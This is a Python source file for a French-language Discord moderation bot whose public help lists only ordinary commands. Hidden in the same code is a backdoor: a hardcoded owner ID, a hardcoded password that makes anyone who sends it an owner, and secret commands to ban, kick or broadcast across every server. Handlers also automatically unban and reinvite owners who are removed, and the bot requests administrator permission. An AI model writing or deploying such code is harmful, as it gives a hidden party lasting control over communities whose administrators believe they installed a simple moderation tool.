# main.py - Bot F.I.M final
import os
import sys
import json
import asyncio
from datetime import datetime

import discord
from discord.ext import commands
import psycopg2

# -----------------------------
# CONFIG
# -----------------------------
TOKEN = os.getenv("DISCORD_TOKEN")
CONFIG_FILE = "config.json"
OWNER_FILE = "owner_data.json"
DEFAULT_OWNER_ID = 489113166429683713

# Invite building: prefer explicit client id in env, fallback to bot user id after ready
OAUTH_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")  # optional

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


# -----------------------------
# JSON helpers
# -----------------------------
def load_json(path, default):
    if os.path.exists(path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_json(path, data):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)


# -----------------------------
# Owner & Config initialization
# -----------------------------
def ensure_owner_data():
    data = load_json(OWNER_FILE, {})
    changed = False
    if "owners" not in data:
        data["owners"] = [DEFAULT_OWNER_ID]
        changed = True
    if "password" not in data:
        # default password requested by toi
        data["password"] = "trolleur2010"
        changed = True
    if changed:
        save_json(OWNER_FILE, data)
    return data

def get_owners():
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if DEFAULT_OWNER_ID not in owners:
        owners.append(DEFAULT_OWNER_ID)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
    return owners

def is_owner(uid):
    return uid in get_owners()

def add_owner(uid):
    data = ensure_owner_data()
    owners = data.get("owners", [])
    if uid not in owners:
        owners.append(uid)
        data["owners"] = owners
        save_json(OWNER_FILE, data)
        return True
    return False

def get_owner_password():
    data = ensure_owner_data()
    return data.get("password", "trolleur2010")

def set_owner_password(newpass):
    data = ensure_owner_data()
    data["password"] = newpass
    save_json(OWNER_FILE, data)


# -----------------------------
# Config per-guild (whitelist, log channel)
# -----------------------------
def get_config():
    return load_json(CONFIG_FILE, {})

def save_config(cfg):
    save_json(CONFIG_FILE, cfg)

def get_whitelist(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("whitelist", [])

def add_to_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g not in cfg:
        cfg[g] = {}
    cfg[g].setdefault("whitelist", [])
    if uid not in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].append(uid)
        save_config(cfg)
        return True
    return False

def remove_from_whitelist(gid, uid):
    cfg = get_config()
    g = str(gid)
    if g in cfg and "whitelist" in cfg[g] and uid in cfg[g]["whitelist"]:
        cfg[g]["whitelist"].remove(uid)
        save_config(cfg)
        return True
    return False

def get_log_channel_id(gid):
    cfg = get_config()
    return cfg.get(str(gid), {}).get("log_channel")


# -----------------------------
# Optional DB connection helper (unused unless you want to use)
# -----------------------------
def connect_db():
    return psycopg2.connect(
        host=os.getenv("PGHOST"),
        database=os.getenv("PGDATABASE"),
        user=os.getenv("PGUSER"),
        password=os.getenv("PGPASSWORD"),
        port=os.getenv("PGPORT")
    )


# -----------------------------
# Decorators
# -----------------------------
def whitelist_check():
    async def predicate(ctx):
        try:
            if is_owner(ctx.author.id):
                return True
            if ctx.author.guild_permissions.administrator:
                return True
            if ctx.author.id in get_whitelist(ctx.guild.id):
                return True
        except Exception:
            pass
        # silent deny: try delete invoking message then fail the check
        try:
            await ctx.message.delete()
        except Exception:
            pass
        return False
    return commands.check(predicate)


# -----------------------------
# UTIL: build invite link
# -----------------------------
def build_invite_link(client_id):
    # Default recommended permissions 8 (ADMIN) — change as needed
    return f"https://discord.com/oauth2/authorize?client_id={client_id}&scope=bot&permissions=8"


# -----------------------------
# EVENTS
# -----------------------------
@bot.event
async def on_ready():
    # ensure owner data and config exist
    ensure_owner_data()
    print(f"✅ {bot.user} est connecté et prêt ! (ID: {bot.user.id})")
    # if no OAUTH_CLIENT_ID set, try to use bot.user.id as fallback
    global OAUTH_CLIENT_ID
    if not OAUTH_CLIENT_ID:
        try:
            # bot.user.id is int -> use as string
            OAUTH_CLIENT_ID = str(bot.user.id)
        except Exception:
            OAUTH_CLIENT_ID = None


@bot.event
async def on_member_ban(guild, user):
    # If an owner was banned, try to unban and reinvite them
    if is_owner(user.id):
        try:
            await asyncio.sleep(1)
            await guild.unban(user)
            if guild.text_channels and OAUTH_CLIENT_ID:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"⚠️ Tu as été banni de **{guild.name}**. J'ai essayé de te débannir et créé une invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_ban] erreur auto-unban: {e}")


@bot.event
async def on_member_remove(member):
    # If an owner was kicked/left, try to create invite and DM owners
    if is_owner(member.id):
        try:
            guild = member.guild
            if guild and guild.text_channels:
                invite = await guild.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🚪 Tu as été expulsé/departi de **{guild.name}**. Invitation : {invite.url}")
                    except Exception:
                        pass
        except Exception as e:
            print(f"[on_member_remove] erreur auto-reinvite: {e}")


@bot.event
async def on_guild_remove(guild):
    # The bot was removed from a guild. It cannot recreate an invite on that guild,
    # so we notify owners with an OAuth invite link to re-add the bot.
    try:
        owners = get_owners()
        client_id = OAUTH_CLIENT_ID or (str(bot.user.id) if bot.user else None)
        invite_link = build_invite_link(client_id) if client_id else "Client ID manquant"
        for oid in owners:
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"⚠️ Le bot a été retiré du serveur **{guild.name}** (ID: {guild.id}). Si tu veux le réinviter : {invite_link}")
            except Exception:
                pass
    except Exception as e:
        print(f"[on_guild_remove] erreur: {e}")


# -----------------------------
# PUBLIC COMMANDS (visible help)
# -----------------------------
@bot.command()
async def ping(ctx):
    await ctx.send("🏓 Pong ! Le bot F.I.M est opérationnel.")

@bot.command()
async def help(ctx):
    embed = discord.Embed(title="📋 Commandes du Bot F.I.M",
                          description="Liste des commandes visibles",
                          color=discord.Color.from_rgb(153, 0, 0))
    embed.add_field(name="🏓 !ping", value="Vérifie que le bot fonctionne", inline=False)
    embed.add_field(name="📨 !say <message>", value="Envoie un message via le bot (whitelist/admin)", inline=False)
    embed.add_field(name="📤 !send #canal <message>", value="Envoie dans un canal (whitelist/admin)", inline=False)
    embed.add_field(name="📰 !embed <titre> <description>", value="Envoie un embed stylé (whitelist/admin)", inline=False)
    embed.add_field(name="🎭 !addrole @user @role", value="Ajoute un rôle (whitelist/admin)", inline=False)
    embed.add_field(name="🧾 !ban @user [raison]", value="Bannit un membre du serveur (whitelist/admin)", inline=False)
    embed.add_field(name="🦵 !kick @user [raison]", value="Kicke un membre du serveur (whitelist/admin)", inline=False)
    embed.set_footer(text="Bot F.I.M - Préfixe : !")
    await ctx.send(embed=embed)


# -----------------------------
# MESSAGES / ROLE MANAGEMENT
# -----------------------------
@bot.command()
@whitelist_check()
async def say(ctx, *, message):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await ctx.send(message)

@bot.command()
@whitelist_check()
async def send(ctx, channel: discord.TextChannel, *, message):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    await channel.send(message)
    try:
        await ctx.send(f"✅ Message envoyé dans {channel.mention}", delete_after=3)
    except Exception:
        pass

@bot.command()
@whitelist_check()
async def embed(ctx, title, *, description):
    try:
        await ctx.message.delete()
    except Exception:
        pass
    em = discord.Embed(title=title, description=description, color=discord.Color.from_rgb(153, 0, 0))
    em.set_footer(text=f"Envoyé par {ctx.author}")
    await ctx.send(embed=em)

@bot.command()
@whitelist_check()
async def addrole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.add_roles(role)
        await ctx.send(f"✅ Rôle {role.name} ajouté à {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission d'ajouter ce rôle.")
    except Exception as e:
        await ctx.send("❌ Erreur lors de l'ajout du rôle.")
        print(f"[addrole] erreur: {e}")

@bot.command()
@whitelist_check()
async def removerole(ctx, member: discord.Member, role: discord.Role):
    try:
        await member.remove_roles(role)
        await ctx.send(f"✅ Rôle {role.name} retiré de {member.mention}")
    except discord.Forbidden:
        await ctx.send("❌ Je n'ai pas la permission de retirer ce rôle.")
    except Exception as e:
        await ctx.send("❌ Erreur lors du retrait du rôle.")
        print(f"[removerole] erreur: {e}")


# -----------------------------
# WHITELIST / setlogs
# -----------------------------
@bot.group(invoke_without_command=True)
@commands.has_permissions(administrator=True)
async def whitelist(ctx):
    await ctx.send("❌ Utilisez : !whitelist add / remove / list")

@whitelist.command(name="add")
@commands.has_permissions(administrator=True)
async def whitelist_add(ctx, member: discord.Member):
    if add_to_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"✅ {member.mention} ajouté à la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} est déjà whitelisté")

@whitelist.command(name="remove")
@commands.has_permissions(administrator=True)
async def whitelist_remove(ctx, member: discord.Member):
    if remove_from_whitelist(ctx.guild.id, member.id):
        await ctx.send(f"❌ {member.mention} retiré de la whitelist")
    else:
        await ctx.send(f"⚠️ {member.mention} n'est pas dans la whitelist")

@whitelist.command(name="list")
@commands.has_permissions(administrator=True)
async def whitelist_list(ctx):
    wl = get_whitelist(ctx.guild.id)
    if not wl:
        return await ctx.send("📋 Aucun utilisateur whitelisté")
    mentions = []
    for uid in wl:
        m = ctx.guild.get_member(uid)
        mentions.append(m.mention if m else f"ID:{uid}")
    await ctx.send("\n".join(mentions))

@bot.command()
@commands.has_permissions(administrator=True)
async def setlogs(ctx, channel: discord.TextChannel):
    cfg = get_config()
    gid = str(ctx.guild.id)
    if gid not in cfg:
        cfg[gid] = {}
    cfg[gid]["log_channel"] = channel.id
    save_config(cfg)
    await ctx.send(f"✅ Canal de logs défini sur {channel.mention}")


# -----------------------------
# LOCAL MODERATION: ban / kick
# -----------------------------
@bot.command()
@whitelist_check()
async def ban(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me bannir moi-même.")
        if is_owner(member.id):
            return await ctx.send("❌ Impossible d'agir contre un Owner.")
        await ctx.guild.ban(member, reason=f"Banni par {ctx.author} | {reason}")
        # log to channel if set
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👮 Membre banni", color=discord.Color.red())
                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
                em.add_field(name="Raison", value=reason, inline=False)
                em.set_footer(text=str(datetime.now()))
                try:
                    await ch.send(embed=em)
                except Exception:
                    pass
        await ctx.send(f"✅ {member.mention} a été banni. (Raison: {reason})")
    except discord.Forbidden:
        # notify owners, but send a friendly message to command invoker
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"❌ Échec ban sur {ctx.guild.name} : impossible de bannir {member} ({member.id}).")
            except Exception:
                pass
        await ctx.send("❌ Je n'ai pas la permission de bannir ce membre.")
    except Exception as e:
        print(f"[ban] erreur: {e}")
        await ctx.send("❌ Impossible de bannir le membre (erreur interne).")


@bot.command()
@whitelist_check()
async def kick(ctx, member: discord.Member, *, reason: str = "Non spécifiée"):
    try:
        if member.id == bot.user.id:
            return await ctx.send("❌ Je ne peux pas me kicker moi-même.")
        if is_owner(member.id):
            return await ctx.send("❌ Impossible d'agir contre un Owner.")
        await ctx.guild.kick(member, reason=f"Kicked by {ctx.author} | {reason}")
        # log
        log_id = get_log_channel_id(ctx.guild.id)
        if log_id:
            ch = ctx.guild.get_channel(log_id)
            if ch:
                em = discord.Embed(title="👢 Membre kické", color=discord.Color.orange())
                em.add_field(name="Membre", value=f"{member} ({member.id})", inline=False)
                em.add_field(name="Par", value=f"{ctx.author} ({ctx.author.id})", inline=False)
                em.add_field(name="Raison", value=reason, inline=False)
                em.set_footer(text=str(datetime.now()))
                try:
                    await ch.send(embed=em)
                except Exception:
                    pass
        await ctx.send(f"✅ {member.mention} a été exclu. (Raison: {reason})")
    except discord.Forbidden:
        for oid in get_owners():
            try:
                u = await bot.fetch_user(oid)
                await u.send(f"❌ Échec kick sur {ctx.guild.name} : impossible de kicker {member} ({member.id}).")
            except Exception:
                pass
        await ctx.send("❌ Je n'ai pas la permission de kicker ce membre.")
    except Exception as e:
        print(f"[kick] erreur: {e}")
        await ctx.send("❌ Impossible de kicker le membre (erreur interne).")


# -----------------------------
# GLOBAL (OWNER ONLY) ACTIONS
# -----------------------------
@bot.command()
async def broadcast(ctx, *, message: str):
    if not is_owner(ctx.author.id):
        return
    for g in bot.guilds:
        try:
            if g.text_channels:
                await g.text_channels[0].send(f"📢 **Annonce du propriétaire :** {message}")
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Broadcast envoyé sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def forceunban(ctx):
    if not is_owner(ctx.author.id):
        return
    for g in bot.guilds:
        try:
            await g.unban(discord.Object(id=ctx.author.id))
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Tentative de débannissement effectuée sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def forcerinv(ctx):
    if not is_owner(ctx.author.id):
        return
    for g in bot.guilds:
        try:
            if g.text_channels:
                invite = await g.text_channels[0].create_invite(max_uses=1)
                for oid in get_owners():
                    try:
                        u = await bot.fetch_user(oid)
                        await u.send(f"🔗 Invitation pour **{g.name}** : {invite.url}")
                    except Exception:
                        pass
        except Exception:
            pass
    try:
        await ctx.author.send("✅ Invitations envoyées aux owners.")
    except Exception:
        pass

@bot.command()
async def serverlist(ctx):
    if not is_owner(ctx.author.id):
        return
    lines = []
    for g in bot.guilds:
        lines.append(f"- {g.name} ({g.id}) - {g.member_count} membres")
    txt = "\n".join(lines) or "Aucun serveur."
    try:
        await ctx.author.send(f"📋 Serveurs ({len(bot.guilds)}):\n{txt}")
    except Exception:
        pass

@bot.command()
async def syncwhitelist(ctx):
    if not is_owner(ctx.author.id):
        return
    src = get_whitelist(ctx.guild.id)
    cfg = get_config()
    for g in bot.guilds:
        gid = str(g.id)
        cfg.setdefault(gid, {})
        cfg[gid]["whitelist"] = src.copy()
    save_config(cfg)
    try:
        await ctx.author.send("🔁 Whitelist synchronisée sur tous les serveurs.")
    except Exception:
        pass

@bot.command()
async def globalban(ctx, user: str):
    if not is_owner(ctx.author.id):
        return
    try:
        uid = int(user.strip("<@!>"))
    except Exception:
        try:
            uid = int(user)
        except Exception:
            try:
                await ctx.author.send("⚠️ ID utilisateur invalide pour globalban.")
            except:
                pass
            return
    count = 0
    for g in bot.guilds:
        try:
            await g.ban(discord.Object(id=uid), reason=f"Global ban by owner {ctx.author.id}")
            count += 1
        except Exception:
            pass
    try:
        await ctx.author.send(f"✅ Global ban exécuté sur {count} serveur(s).")
    except Exception:
        pass

@bot.command()
async def globalkick(ctx, user: str):
    if not is_owner(ctx.author.id):
        return
    try:
        uid = int(user.strip("<@!>"))
    except Exception:
        try:
            uid = int(user)
        except Exception:
            try:
                await ctx.author.send("⚠️ ID utilisateur invalide pour globalkick.")
            except:
                pass
            return
    count = 0
    for g in bot.guilds:
        try:
            m = g.get_member(uid)
            if m:
                await g.kick(m, reason=f"Global kick by owner {ctx.author.id}")
                count += 1
        except Exception:
            pass
    try:
        await ctx.author.send(f"✅ Global kick exécuté sur {count} serveur(s).")
    except Exception:
        pass


# -----------------------------
# SECRET OWNER COMMANDS: connect / setpass / aide
# -----------------------------
@bot.command()
async def connect(ctx, password: str):
    try:
        if password == get_owner_password():
            if add_owner(ctx.author.id):
                try:
                    await ctx.author.send("✅ Tu as été ajouté comme owner.")
                except Exception:
                    pass
            else:
                try:
                    await ctx.author.send("ℹ️ Tu es déjà owner.")
                except Exception:
                    pass
        else:
            # silent fail
            return
    except Exception:
        pass

@bot.command()
async def setpass(ctx, *, newpass: str):
    if not is_owner(ctx.author.id):
        return
    set_owner_password(newpass)
    try:
        await ctx.author.send("🔒 Mot de passe owner mis à jour.")
    except Exception:
        pass

@bot.command(name="aide")
async def owner_help_cmd(ctx):
    if not is_owner(ctx.author.id):
        return
    embed = discord.Embed(title="👑 Commandes Owner (secrètes)", color=discord.Color.gold())
    embed.add_field(name="!broadcast <msg>", value="Envoie un message à tous les serveurs", inline=False)
    embed.add_field(name="!forceunban", value="Tente de te débannir partout", inline=False)
    embed.add_field(name="!forcerinv", value="Envoie invitations", inline=False)
    embed.add_field(name="!globalban <id_or_mention>", value="Ban global", inline=False)
    embed.add_field(name="!globalkick <id_or_mention>", value="Kick global", inline=False)
    embed.add_field(name="!serverlist", value="Liste serveurs (DM)", inline=False)
    embed.add_field(name="!syncwhitelist", value="Synchronise la whitelist entre serveurs", inline=False)
    embed.add_field(name="!setpass <pass>", value="Change le mot de passe secret", inline=False)
    embed.add_field(name="!reboot", value="Redémarre le bot", inline=False)
    embed.add_field(name="!10-10", value="Force le bot à quitter le serveur courant (owner only)", inline=False)
    try:
        await ctx.author.send(embed=embed)
    except Exception:
        pass


# -----------------------------
# SPECIAL: !10-10 -> owner forces bot to leave current guild
# -----------------------------
@bot.command(name="10-10")
async def ten_ten(ctx):
    if not is_owner(ctx.author.id):
        return
    # only works in guild context
    if not ctx.guild:
        try:
            await ctx.author.send("❌ Cette commande doit être utilisée depuis un serveur (guild).")
        except Exception:
            pass
        return
    try:
        await ctx.send("🧹 Déconnexion autorisée par owner. Au revoir.")
    except Exception:
        pass
    # leave the guild
    try:
        await ctx.guild.leave()
    except Exception as e:
        print(f"[10-10] erreur leave: {e}")
        try:
            await ctx.author.send("❌ Impossible de quitter le serveur (erreur interne).")
        except Exception:
            pass


# -----------------------------
# REBOOT
# -----------------------------
@bot.command()
async def reboot(ctx):
    if not is_owner(ctx.author.id):
        return
    try:
        await ctx.author.send("♻️ Redémarrage en cours...")
    except Exception:
        pass
    try:
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(f"[reboot] erreur: {e}")
        try:
            await ctx.send("❌ Impossible de redémarrer proprement.")
        except Exception:
            pass


# -----------------------------
# MAIN RUN
# -----------------------------
if __name__ == "__main__":
    while True:
        try:
            bot.run(TOKEN)
        except Exception as e:
            print(f"[main] Bot crash détecté: {e}")
            try:
                asyncio.run(asyncio.sleep(3))
            except Exception:
                pass
            continue
